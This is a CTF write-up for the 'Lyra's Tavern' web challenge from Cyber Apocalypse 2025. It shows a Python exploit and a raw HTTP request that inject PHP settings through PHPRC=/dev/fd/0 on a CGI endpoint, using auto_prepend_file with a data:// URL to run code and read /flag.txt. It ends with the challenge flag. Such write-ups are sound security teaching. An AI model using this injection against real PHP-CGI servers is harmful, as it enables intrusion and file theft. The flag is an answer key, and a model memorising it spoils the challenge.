---
title: "Lyra’s Tavern - Cyber Apocalypse CTF 2025: Tales from Eldoria"
category: "web"
subcategory: "lfi"
type: "writeup"
tags: ["web", "secure-coding", "lfi", "burp", "base64", "wordpress", "cgi", "cyber-apocalypse-ctf-2025-tale", "cyber-apocalypse-ctf-2025-tales-fr", "2025", "ctf-writeup"]
summary: "This is a Secure Coding challenge."
source:
  name: "CTFtime writeup #40116"
  url: "https://ctftime.org/writeup/40116"
original_source: "https://lamecarrot.wordpress.com/2025/03/26/hackthebox-cyber-apocalypse-ctf-2025-lyras-tavern/"
ctf:
  name: "Cyber Apocalypse CTF 2025: Tales from Eldoria"
  year: 2025
  challenge: "Lyra’s Tavern"
---

## Metadata

- **CTF:** Cyber Apocalypse CTF 2025: Tales from Eldoria
- **Task:** Lyra’s Tavern
- **Author team:** Team Kirby
- **CTFtime tags:** web, secure-coding
- **CTFtime:** <https://ctftime.org/writeup/40116>
- **Original writeup:** <https://lamecarrot.wordpress.com/2025/03/26/hackthebox-cyber-apocalypse-ctf-2025-lyras-tavern/>

---
This is a Secure Coding challenge. However, I solved it using the unintended way using [Local File Inclusion (LFI)](<https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion>) only. You may access the official write-up [here](<https://github.com/hackthebox/cyber-apocalypse-2025/tree/main/secure_coding/Lyra's%20Tavern%20-%20Easy>).

# Description

Lyra's Tavern is a simple and adventurous place for the common day adventurer to rest and get some drinks while having entertainment. She recently released a system for adventurers to share their experiences in form of chronicles. However, there has been evidence of backdoor access on the server forcing her to isolate it for maintenance. She has trusted you with the source code to find and fix any vulnerability evident within the system. Can you undertake this crucial task and assist us to give the adventurers this unique experience ? A handsome reward awaits ;)

# Files

\- challenge  
\- application  
\- includes  
\- auth.php  
\- database.php  
\- footer.php  
\- sample_data.php  
\- settings.php  
\- public  
\- login.php  
\- logout.php  
\- my-journals.php  
\- new-journals.php  
\- register.php  
\- static  
\- css  
\- style.css  
\- tailwind.min.css  
\- js  
\- animations.js  
\- lucide.min.js  
\- tsparticles.slim.bundle.min.js  
\- 2043.min.js  
\- 5239.min.js  
\- config.php  
\- [exploit.py](http://exploit.py)  
\- index.php  
\- server_config.php  
\- flag.txt  
\- config  
\- apache2.conf  
\- app.cgi  
\- cgi-bin.conf  
\- fpm.conf  
\- proper_config.ini  
\- supervisord.conf  
\- [build_docker.sh](http://build_docker.sh)  
\- Dockerfile  
\- [note.md](http://note.md)

# Solution

As the exploit file, `[exploit.py](http://exploit.py)`, has been given to us, it revealed that the vulnerability is related to [Local File Inclusion (LFI)](<https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion>). Based on another challenge, Arcane Auctions, in this CTF, we know that the exploit file is not accurate. We will have to manually fuzz a bit by modifying some parameters.

```python  
#!/usr/bin/env python3

# Modules  
import requests, base64, urllib.parse  
URL = "http://127.0.0.1"

payload = b' /www/application/out.txt"); ?>'  
data_url = f"data://text/plain;base64,{base64.b64encode(payload).decode()}"  
data = {  
"data":urllib.parse.quote(f"allow_url_include=1\nauto_prepend_file=\"{data_url}\"")  
}

response = [requests.post](http://requests.post)(f"{URL}/cgi-bin/app.cgi?PHPRC=/dev/fd/0", data=data)  
print("[*] HTTP Status:", response.status_code)  
response = requests.get(f"{URL}/out.txt")

if (response.status_code != 200):  
print("[-] Exploit failed!")  
exit()

print("[+] Data: ", response.text)  
```

Therefore, I modified the parameters via BurpSuite before able to trigger LFI as shown below.

![](<https://lamecarrot.wordpress.com/wp-content/uploads/2025/03/pasted-image-20250324144836.png>)

Since LFI works, why not LFI the flag file?

```  
POST /cgi-bin/app.cgi?PHPRC=/dev/fd/0 HTTP/1.1  
Host: 83.136.248.90:45747  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36  
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7  
Content-Type: application/x-www-form-urlencoded  
Accept-Encoding: gzip, deflate  
Accept-Language: en-US,en;q=0.9  
Cookie: PHPSESSID=2365tk6v5re77lavm1746778j7  
Connection: close  
Content-Length: 32

data=auto_prepend_file=/flag.txt  
```

![](<https://lamecarrot.wordpress.com/wp-content/uploads/2025/03/pasted-image-20250324144800-1.png>)

Flag: `HTB{N0W_Y0U_S33_M3_N0W_Y0U_D0NT!@_281b7dbe0a756bb2ba51ddaeae41c497}`
